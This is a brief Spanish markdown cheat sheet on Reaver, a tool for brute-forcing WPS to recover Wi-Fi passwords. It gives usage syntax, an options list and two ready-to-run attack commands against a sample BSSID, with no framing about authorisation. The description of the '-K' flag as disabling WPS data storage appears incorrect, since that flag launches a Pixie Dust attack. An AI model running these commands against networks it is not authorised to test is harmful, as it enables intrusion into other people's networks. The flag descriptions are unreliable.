### **Hacking Wi-Fi/Reaver.md**

# Reaver

## Descripción

`Reaver` es una herramienta diseñada para realizar ataques de fuerza bruta contra el protocolo WPS (Wi-Fi Protected Setup) en redes Wi-Fi. Explota vulnerabilidades en WPS para recuperar la contraseña de la red de forma automatizada.

## Uso

```bash
reaver [opciones] -i interfaz -b BSSID
```

### Opciones principales

- `-i`: Define la interfaz de red en modo monitor.
- `-b`: Especifica el BSSID del punto de acceso objetivo.
- `-c`: Define el canal de la red.
- `-vv`: Activa el modo muy detallado para depuración.
- `-K`: Desactiva el almacenamiento de datos WPS.

## Ejemplos

- Iniciar un ataque básico a un punto de acceso:

  ```bash
  reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
  ```

- Ejecutar Reaver sin almacenar datos WPS:

  ```bash
  reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -K
  ```
